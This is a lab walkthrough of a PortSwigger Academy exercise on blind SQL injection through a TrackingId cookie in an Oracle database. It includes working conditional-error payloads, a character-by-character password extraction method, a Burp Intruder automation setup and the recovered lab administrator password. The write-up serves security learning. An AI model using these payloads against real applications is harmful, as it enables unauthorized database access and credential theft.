---
slug: "ps-sqli-12"
title: "Blind SQL injection with conditional errors"
platform: "PortSwigger"
difficulty: "Medium"
category: ["Web","SQLi"]
date: "2025-12-20"
minutes: 6
visible: true
tldr: "blind SQL injection vulnerability — solved and documented end to end."
format: "html"
---

<p class="mono lab-crumb">PORTSWIGGER ACADEMY // SQLi SERIES &middot; LAB 12 &middot; <a href="https://github.com/0xWalid/Learnings/tree/main/Portswiggers/01-Sql%20Injection%20Labs/12-%20Blind%20SQL%20injection%20with%20conditional%20errors.md" target="_blank" rel="noopener">original notes &#8599;</a></p>
<p>Exploit a <strong>blind SQL injection vulnerability</strong> to extract the <strong>administrator password</strong> using <strong>conditional database errors</strong> in an Oracle database, where:</p>
<ul><li>No query output is reflected</li><li>No SQL error messages are shown</li><li>The only feedback channel is <strong>whether a database error occurs</strong></li></ul>
<h2>1. Initial Testing &amp; Vulnerability Identification</h2>
<h2>Parameters Tested</h2>
<ul><li><code>category</code></li><li><code>productId</code></li></ul>
<p>Both parameters were tested with a single quote (<code>'</code>) and produced <strong>no observable change</strong>, indicating they were not injectable.</p>
<h2>Cookie-Based Testing</h2>
<p>While inspecting the HTTP request, a cookie parameter named <strong><code>TrackingId</code></strong> was identified and tested.</p>
<h2>Observation</h2>
<ul><li>Normal <code>TrackingId</code> → Application responds normally (HTTP 200)</li><li>Crafted <code>TrackingId</code> payload → Application responds with <strong>HTTP 500 Internal Server Error</strong></li></ul>
<p>This behavior indicates:</p>
<ul><li>The cookie value is included in a SQL query</li><li>SQL errors are suppressed in the response body</li><li>Application behavior changes based on <strong>whether a database error occurs</strong></li></ul>
<p>This confirms a <strong>blind SQL injection vulnerability using conditional errors</strong>.</p>
<h2>2. Why This Is Blind SQL Injection with Conditional Errors</h2>
<p>In this lab:</p>
<ul><li>No database output is displayed</li><li>No SQL error messages are visible</li><li>Page content does not change</li></ul>
<p>The <strong>only observable signal</strong> is:</p>
<ul><li><strong>Error (HTTP 500)</strong> vs <strong>No Error (HTTP 200)</strong></li></ul>
<p>Therefore:</p>
<ul><li><code>UNION SELECT</code> attacks are useless</li><li>Boolean content-based SQLi does not work</li><li>Data must be inferred by <strong>intentionally triggering database errors</strong></li></ul>
<p>The backend query is likely similar to:</p>
<pre class="code" data-lang="sql"><code>SELECT trackingIdFROM tracking
WHERE trackingId='&lt;TrackingId&gt;';
</code></pre>
<h2>3. Confirming Conditional Error Control</h2>
<h2>Payload Used (Conceptual)</h2>
<pre class="code" data-lang="sql"><code>'||(
SELECT CASE
WHEN (1=1) THEN TO_CHAR(1/0)
ELSE ''
END
FROM dual
)||'
</code></pre>
<h2>Result</h2>
<ul><li>Condition TRUE → division by zero → <strong>HTTP 500</strong></li><li>Condition FALSE → no error → <strong>HTTP 200</strong></li></ul>
<p>This confirms full control over <strong>conditional error execution</strong>, which becomes the TRUE/FALSE signal.</p>
<h2>4. Why UNION SELECT Does Not Work</h2>
<h2>Failed Attempt (Example)</h2>
<pre class="code" data-lang="sql"><code>'||UNION SELECT username, password FROM users--'
</code></pre>
<h2>Why It Fails</h2>
<ul><li>The application does not reflect query output</li><li>The backend only reacts to runtime errors</li><li>UNION results are silently ignored</li></ul>
<p><strong>Lesson</strong></p>
<p>If query output is not reflected, immediately switch to <strong>blind SQL injection techniques</strong>.</p>
<h2>5. Why Certain Payloads Failed</h2>
<h2>Failed Payload — Invalid Boolean Context</h2>
<pre class="code" data-lang="sql"><code>ANDSELECT usernameFROM users
</code></pre>
<p><strong>Why it fails</strong></p>
<ul><li><code>AND</code> requires a boolean expression</li><li><code>SELECT</code> returns rows, not TRUE/FALSE</li><li>SQL syntax is invalid in this context</li></ul>
<h2>Failed Payload — Multiple Row Subquery</h2>
<pre class="code" data-lang="sql"><code>AND (SELECT passwordFROM users)='x'
</code></pre>
<p><strong>Why it fails</strong></p>
<ul><li>Oracle does not allow multi-row subqueries in comparisons</li><li>This causes uncontrolled errors</li></ul>
<h2>Corrected Pattern</h2>
<pre class="code" data-lang="sql"><code>AND ROWNUM=1
</code></pre>
<p><strong>Why it works</strong></p>
<ul><li>Forces the subquery to return exactly one row</li><li>Keeps errors condition‑dependent</li></ul>
<h2>6. Core Payload Used in the Lab (Final Form)</h2>
<pre class="code" data-lang="sql"><code>'||(
SELECT CASE
WHEN &lt;condition&gt;
THEN TO_CHAR(1/0)
ELSE ''
END
FROM users
WHERE username='administrator' AND ROWNUM=1
)||'
</code></pre>
<h2>Why This Payload Was Used</h2>
<p>This payload satisfies all lab constraints:</p>
<ul><li>Works in <strong>Oracle</strong></li><li>Preserves SQL syntax using string concatenation (<code>||</code>)</li><li>Triggers errors <strong>only when conditions are TRUE</strong></li><li>Prevents accidental errors using <code>ROWNUM=1</code></li></ul>
<h2>7. SQL Functions Used and Why</h2>
<h2>1️⃣ <code>CASE WHEN</code></h2>
<p>Used to conditionally trigger an error.</p>
<pre class="code" data-lang="sql"><code>CASEWHENconditionTHEN errorELSE safeEND
</code></pre>
<p>Without <code>CASE WHEN</code>, the database would error every time.</p>
<h2>2️⃣ <code>TO_CHAR(1/0)</code></h2>
<ul><li><code>1/0</code> causes a guaranteed runtime error</li><li><code>TO_CHAR()</code> forces evaluation inside a SELECT clause</li><li>Error presence becomes the TRUE signal</li></ul>
<h2>3️⃣ <code>LENGTH()</code></h2>
<pre class="code" data-lang="sql"><code>LENGTH(password)
</code></pre>
<p>Used to determine password length before extraction.</p>
<h2>4️⃣ <code>SUBSTR()</code></h2>
<pre class="code" data-lang="sql"><code>SUBSTR(password, position,1)
</code></pre>
<p>Used to extract <strong>one character at a time</strong>, which is required in blind SQLi.</p>
<h2>8. Actions Performed to Extract the Password</h2>
<h2>Step 1: Confirm Administrator Exists</h2>
<pre class="code" data-lang="sql"><code>WHENEXISTS (SELECT1FROM usersWHERE username='administrator')
</code></pre>
<ul><li>Error occurred → user confirmed</li></ul>
<h2>Step 2: Determine Password Length</h2>
<pre class="code" data-lang="sql"><code>WHEN LENGTH(password)=20
</code></pre>
<ul><li>Error occurred only when length = 20</li></ul>
<h2>Step 3: Character-by-Character Extraction</h2>
<pre class="code" data-lang="sql"><code>WHEN SUBSTR(password,1,1)='6'
</code></pre>
<ul><li>TRUE → error</li><li>FALSE → no error</li></ul>
<p>Each successful error revealed one character.</p>
<h2>Step 4: Automation with Burp Intruder</h2>
<ul><li>Position payload: <code>1–20</code></li><li>Character payload: <code>a–z</code>, <code>0–9</code></li><li>Detection method: <strong>HTTP 500 responses</strong></li><li>Attack type: <strong>Cluster Bomb</strong></li></ul>
<h2>9. Final Result</h2>
<pre class="code" data-lang="text"><code>Username: administrator
Password: 67me9av0blkd0mis1ztm
</code></pre>
<ul><li>Login successful</li><li>Administrator access confirmed</li><li>Lab solved</li><li>Screenshot:</li></ul>
<p>&lt;img width="1248" height="258" alt="image" src="https://github.com/user-attachments/assets/3d79f03f-e52d-42c9-a411-afdc815f3c9f" /&gt;</p>
<h2>10. Future Testing Notes</h2>
<h2>Blind SQL Injection Workflow</h2>
<ul><li>Identify injection point</li><li>Identify feedback channel (errors / timing)</li><li>Confirm conditional control</li><li>Validate data existence</li><li>Determine data length</li><li>Extract incrementally</li><li>Automate repetitive steps</li></ul>
<h2>Common Mistakes to Avoid</h2>
<ul><li>Forgetting <code>ROWNUM=1</code> in Oracle</li><li>Triggering unconditional errors</li><li>Attempting UNION without reflected output</li><li>Skipping existence checks</li></ul>
<h2>11. Notes for My Future Self</h2>
<ul><li>Blind SQLi relies on inference, not output</li><li>Errors can act as a reliable boolean signal</li><li>Oracle requires strict single-row subqueries</li><li>Character-by-character extraction is unavoidable</li><li>Automation is essential for accuracy and speed</li></ul>

<details class="flag-box"><summary><span class="flag-label">LAB STATUS</span><span class="flag-hint"></span></summary><code>SQLi SERIES :: LAB 12 COMPLETE</code></details>
